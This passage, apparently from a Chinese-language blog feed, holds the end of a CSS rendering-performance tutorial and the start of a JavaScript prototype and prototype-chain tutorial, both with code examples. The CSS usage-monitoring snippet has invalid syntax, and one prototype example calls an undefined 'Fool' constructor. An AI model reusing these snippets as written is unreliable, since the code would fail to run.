class="hljs-attribute">all</span>&#x27;&quot;&gt;<br></code></pre></td></tr></table></figure></li><li>计算阶段<ul><li>将 CSS 规则转换为样式规则表（Style Rules）</li><li>遇到 JavaScript 访问 CSSOM 属性时触发同步解析（强制完成 CSSOM 构建）</li></ul></li></ul><p><strong>Q：如何验证 CSSOM 构建阻塞？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 测试代码（放在&lt;head&gt;中）</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;cssom&#x27;</span>);<br><span class="hljs-title function_">getComputedStyle</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;cssom&#x27;</span>); <br><span class="hljs-comment">// 时间差=CSSOM构建耗时</span><br></code></pre></td></tr></table></figure><h3 id="Critical-CSS实战方案"><a href="#Critical-CSS实战方案" class="headerlink" title="Critical CSS实战方案"></a>Critical CSS实战方案</h3><p><strong>Q：首屏优化的Critical CSS提取策略？</strong></p><p>工具链：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用Penthouse提取关键CSS</span><br>npm install penthouse -g<br>penthouse http://example.com critical.css<br></code></pre></td></tr></table></figure><p>实施步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 内联关键CSS --&gt;<br>&lt;style&gt;<br>  .header, .hero &#123; /* 首屏可见区域样式 */ &#125;<br>&lt;/style&gt;<br><br>&lt;!-- 异步加载剩余CSS --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;full.css&quot; as=&quot;style&quot; onload=&quot;this.rel=&#x27;stylesheet&#x27;&quot;&gt;<br>&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;full.css&quot;&gt;&lt;/noscript&gt;<br></code></pre></td></tr></table></figure><h3 id="CSS与JavaScript"><a href="#CSS与JavaScript" class="headerlink" title="CSS与JavaScript"></a>CSS与JavaScript</h3><p><strong>Q：为什么说”CSS会阻塞JavaScript执行”？</strong></p><ul><li>默认行为：<ul><li>浏览器遇到<code>&lt;script&gt;</code>时会暂停 DOM 构建</li><li>如果存在未完成的 CSSOM 构建，JavaScript执行将被阻塞</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;link rel=&quot;stylesheet&quot; href=&quot;slow.css&quot;&gt;<br>&lt;script&gt;<br>  // 此脚本必须等待slow.css下载并解析完成<br>  console.log(&#x27;After CSSOM&#x27;);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>Q：优化方案？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 方案1：添加defer --&gt;<br>&lt;script defer src=&quot;app.js&quot;&gt;&lt;/script&gt;<br><br>&lt;!-- 方案2：动态注入CSS --&gt;<br>&lt;script&gt;<br>  const link = document.createElement(&#x27;link&#x27;);<br>  link.rel = &#x27;stylesheet&#x27;;<br>  link.href = &#x27;non-critical.css&#x27;;<br>  document.head.appendChild(link);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="如何设计CSS性能监控埋点系统"><a href="#如何设计CSS性能监控埋点系统" class="headerlink" title="如何设计CSS性能监控埋点系统"></a>如何设计CSS性能监控埋点系统</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 监控CSS加载时间</span><br><span class="hljs-keyword">const</span> cssResource = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">&#x27;resource&#x27;</span>)<br>  .<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">&#x27;css&#x27;</span>);<br>  <br><span class="hljs-comment">// 2. 检测未使用CSS</span><br><span class="hljs-keyword">const</span> &#123; unusedRules &#125; = <span class="hljs-keyword">await</span> chrome.<span class="hljs-property">devtools</span>.<span class="hljs-property">inspectedWindow</span>.<span class="hljs-built_in">eval</span>(<br>  <span class="hljs-string">`(<span class="hljs-subst">$&#123;() =&gt; &#123;</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-keyword">const</span> used = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>();</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(<span class="hljs-variable language_">document</span>.querySelectorAll(<span class="hljs-string">&#x27;*&#x27;</span>))</span></span><br><span class="hljs-subst"><span class="hljs-string">      .forEach(el =&gt; used.add(el.className));</span></span><br><span class="hljs-subst"><span class="hljs-string">    <span class="hljs-keyword">return</span> unusedRules: <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(<span class="hljs-variable language_">document</span>.styleSheets)</span></span><br><span class="hljs-subst"><span class="hljs-string">      .flatMap(sheet =&gt; <span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(sheet.cssRules)</span></span><br><span class="hljs-subst"><span class="hljs-string">      .filter(rule =&gt; !used.has(rule.selectorText))</span></span><br><span class="hljs-subst"><span class="hljs-string">  &#125;&#125;</span>)()`</span><br>);<br></code></pre></td></tr></table></figure><h1 id="第七章：实战与前沿技术"><a href="#第七章：实战与前沿技术" class="headerlink" title="第七章：实战与前沿技术"></a>第七章：实战与前沿技术</h1><h2 id="7-1-CSS-绘制复杂图形（clip-path、SVG-CSS）"><a href="#7-1-CSS-绘制复杂图形（clip-path、SVG-CSS）" class="headerlink" title="7.1 CSS 绘制复杂图形（clip-path、SVG + CSS）"></a>7.1 CSS 绘制复杂图形（clip-path、SVG + CSS）</h2><h2 id="7-2-暗黑模式实现（prefers-color-scheme）"><a href="#7-2-暗黑模式实现（prefers-color-scheme）" class="headerlink" title="7.2 暗黑模式实现（prefers-color-scheme）"></a>7.2 暗黑模式实现（prefers-color-scheme）</h2><h2 id="7-3-视差滚动（background-attachment）"><a href="#7-3-视差滚动（background-attachment）" class="headerlink" title="7.3 视差滚动（background-attachment）"></a>7.3 视差滚动（background-attachment）</h2><h2 id="7-4-CSS-Houdini（自定义属性、Paint-API）"><a href="#7-4-CSS-Houdini（自定义属性、Paint-API）" class="headerlink" title="7.4 CSS Houdini（自定义属性、Paint API）"></a>7.4 CSS Houdini（自定义属性、Paint API）</h2><h2 id="7-5-未来-CSS-趋势（-container、subgrid、-has-）"><a href="#7-5-未来-CSS-趋势（-container、subgrid、-has-）" class="headerlink" title="7.5 未来 CSS 趋势（@container、subgrid、:has()）"></a>7.5 未来 CSS 趋势（@container、subgrid、:has()）</h2>]]></content>
    
    
    <categories>
      
      <category>CSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript 原型/原型链专题知识学习</title>
    <link href="/2025/06/21/JavaScript%20Prototype/"/>
    <url>/2025/06/21/JavaScript%20Prototype/</url>
    
    <content type="html"><![CDATA[<h1 id="第一章：JavaScript-对象基础"><a href="#第一章：JavaScript-对象基础" class="headerlink" title="第一章：JavaScript 对象基础"></a>第一章：JavaScript 对象基础</h1><h2 id="1-1-对象的概念与创建方式"><a href="#1-1-对象的概念与创建方式" class="headerlink" title="1.1 对象的概念与创建方式"></a>1.1 对象的概念与创建方式</h2><p><strong>基本概念</strong></p><p>JavaScript 对象是键值对的集合，是 JavaScript 的核心数据类型。对象可以看作是无序的属性集合，每个属性都有一个名称（键）和一个值。</p><p>对象的特点有以下几点：</p><ul><li>动态性：随时可添加&#x2F;删除属性</li><li>引用类型：对象是通过引用访问的复合值</li><li>原型继承：每个对象都有原型链</li><li>属性特性：对象的属性可以拥有可读、可写、可枚举、可配置等特性</li></ul><span id="more"></span><p><strong>创建方式</strong></p><p>（1）对象字面量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;张三&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,<br>  <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我是<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）new Object()构造函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> car = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>car.<span class="hljs-property">brand</span> = <span class="hljs-string">&#x27;Toyota&#x27;</span>;<br>car.<span class="hljs-property">model</span> = <span class="hljs-string">&#x27;Camry&#x27;</span>;<br></code></pre></td></tr></table></figure><p>（3）构造函数方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">const</span> person1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;李四&#x27;</span>, <span class="hljs-number">25</span>);<br></code></pre></td></tr></table></figure><p>（4）Object.create()方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> prototypeObj = &#123;<br>  <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello!&#x27;</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> myObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(prototypeObj);<br>myObj.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;王五&#x27;</span>;<br></code></pre></td></tr></table></figure><p>（5）ES6 class 语法糖</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>  <br>  <span class="hljs-title function_">speak</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span> makes a noise.`</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">&#x27;Dog&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="1-2-属性的访问与操作"><a href="#1-2-属性的访问与操作" class="headerlink" title="1.2 属性的访问与操作"></a>1.2 属性的访问与操作</h2><p><strong>访问属性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 点表示法</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);<br><br><span class="hljs-comment">// 方括号表示法</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[<span class="hljs-string">&#x27;age&#x27;</span>]);<br></code></pre></td></tr></table></figure><p><strong>属性操作</strong></p><p>（1）添加&#x2F;删除属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">person.<span class="hljs-property">job</span> = <span class="hljs-string">&#x27;Developer&#x27;</span>;<br>person[<span class="hljs-string">&#x27;hobby&#x27;</span>] = <span class="hljs-string">&#x27;Reading&#x27;</span>;<br></code></pre></td></tr></table></figure><p>（2）删除属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">delete</span> person.<span class="hljs-property">age</span>;<br></code></pre></td></tr></table></figure><p>（3）检查属性是否存在</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> person); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h2 id="1-3-对象与原始类型的区别"><a href="#1-3-对象与原始类型的区别" class="headerlink" title="1.3 对象与原始类型的区别"></a>1.3 对象与原始类型的区别</h2><ul><li>存储与访问机制：原始类型存储在栈内存中，对象类型存储在堆内存中，变量保存其引用地址</li><li>可变性差异：原始类型不可变，对象类型可变</li><li>比较行为：原始类型对比值，对象类型对比引用</li><li>方法与属性：原始类型不能添加属性和方法，对象类型可以自由添加&#x2F;修改</li></ul><h1 id="第二章：初识原型（Prototype）"><a href="#第二章：初识原型（Prototype）" class="headerlink" title="第二章：初识原型（Prototype）"></a>第二章：初识原型（Prototype）</h1><h2 id="2-1-什么是原型？"><a href="#2-1-什么是原型？" class="headerlink" title="2.1 什么是原型？"></a>2.1 什么是原型？</h2><p>原型（Prototype）是 JavaScript 实现继承的核心机制。每个 JavaScript 对象都有一个内置的 [[Prototype]] 属性（可通过 <code>__proto__</code> 访问），指向它的原型对象</p><h2 id="2-2-prototype-属性的作用"><a href="#2-2-prototype-属性的作用" class="headerlink" title="2.2 prototype 属性的作用"></a>2.2 <code>prototype</code> 属性的作用</h2><p>prototype 是 JavaScript 中函数对象特有的属性，它的核心作用是为基于该构造函数创建的实例提供共享的属性和方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-comment">// 添加到prototype的方法会被所有实例共享</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br>p1.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// Hi, I&#x27;m Alice</span><br></code></pre></td></tr></table></figure><h2 id="2-3-默认原型：Object-prototype"><a href="#2-3-默认原型：Object-prototype" class="headerlink" title="2.3 默认原型：Object.prototype"></a>2.3 默认原型：<code>Object.prototype</code></h2><p>Object.prototype 是 JavaScript 中所有对象的终极原型，是原型链的顶端（终点是 null）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span>); <span class="hljs-comment">// null</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-keyword">const</span> f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Fool</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(f.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) <span class="hljs-comment">// undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(f.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>它包含所有对象继承的基本方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 常见方法</span><br>.<span class="hljs-title function_">toString</span>()<br>.<span class="hljs-title function_">valueOf</span>()<br>.<span class="hljs-title function_">hasOwnProperty</span>()<br>.<span class="hljs-title function_">isPrototypeOf</span>()<br></code></pre></td></tr></table></figure><p>默认继承关系如下：</p><pre class="mermaid">graph LR    A[你的对象] --> B[Object.prototype]    C[数组] --> D[Array.prototype] --> B    E[函数] --> F[Function.prototype] --> B    B --> G[null]</pre><h2 id="2-4-通过原型共享属性和方法"><a href="#2-4-通过原型共享属性和方法" class="headerlink" title="2.4 通过原型共享属性和方法"></a>2.4 通过原型共享属性和方法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// 实例属性（不共享）</span><br>&#125;<br><br><span class="hljs-comment">// 添加到prototype的方法会被所有实例共享</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br><br><span class="hljs-keyword">const</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-keyword">const</span> p2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Bob&#x27;</span>);<br><br>p1.<span class="hljs-property">sayHello</span> === p2.<span class="hljs-property">sayHello</span> <span class="hljs-comment">// true（共享同一方法）</span><br></code></pre></td></tr></table></figure><h1 id="第三章：构造函数与实例"><a href="#第三章：构造函数与实例" class="headerlink" title="第三章：构造函数与实例"></a>第三章：构造函数与实例</h1><h2 id="3-1-构造函数的作用与定义"><a href="#3-1-构造函数的作用与定义" class="headerlink" title="3.1 构造函数的作用与定义"></a>3.1 构造函数的作用与定义</h2><p><strong>作用</strong></p><ol><li>创建对象模版：定义一类对象的共同属性和方法</li><li>初始化对象状态：为新对象设置初始属性值</li><li>实现原型继承：通过 prototype 共享属性和方法</li><li>类型标识：通过 instanceof 识别对象类型</li></ol><p><strong>定义方式</strong></p><p>（1）传统定义方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-comment">// 实例属性</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  <br>  <span class="hljs-comment">// 不推荐：每个实例都会创建新函数</span><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 推荐：共享方法</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">introduce</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.age&#125;</span> years old`</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>（2）class 语法糖</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>  &#125;<br>  <br>  <span class="hljs-comment">// 自动添加到prototype</span><br>  <span class="hljs-title function_">introduce</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>, <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.age&#125;</span> years old`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造函数具有以下特征：</p><ol><li>命名约定：首字母大写（如 Person）</li><li>必须以 <code>new</code> 调用：否则 <code>this</code> 指向全局对象（严格模式下会报错）</li><li>隐式返回：自动返回新对象（除非手动返回非原始值）</li></ol><h2 id="3-2-new-操作符的执行过程"><a href="#3-2-new-操作符的执行过程" class="headerlink" title="3.2 new 操作符的执行过程"></a>3.2 <code>new</code> 操作符的执行过程</h2><p>当使用 new 调用构造函数时，JavaScript 引擎会完成以下操作：</p><ol><li>隐式创建新对象：创建一个新的空对象</li><li>设置原型链接：将该对象的 <code>[[Prototype]]</code> 属性（即 <code>__proto__</code>）链接到构造函数的 prototype 属性</li><li>绑定 this：将新对象绑定到构造函数内部的 this 上下文</li><li>自动返回：<ul><li>如果构造函数没有显式 return 语句，自动返回新创建的对象</li><li>如果 return 非对象类型，仍返回新对象（忽略 return）</li><li>如果 return 对象类型，则返回该对象（覆盖默认行为）</li></ul></li></ol><p><strong>代码示例</strong></p><p>（1）无 return 语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-comment">// 无 return 语句</span><br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p); <span class="hljs-comment">// Person &#123; name: &quot;Alice&quot; &#125;（返回新对象）</span><br></code></pre></td></tr></table></figure><p>（2）return 非对象（原始值）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">model</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">model</span> = model;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">123</span>; <span class="hljs-comment">// 原始值被忽略</span><br>&#125;<br><br><span class="hljs-keyword">const</span> c = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">&#x27;Tesla&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(c); <span class="hljs-comment">// Car &#123; model: &quot;Tesla&quot; &#125;（仍返回新对象）</span><br></code></pre></td></tr></table></figure><p>（3）return 对象类型（覆盖默认行为）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 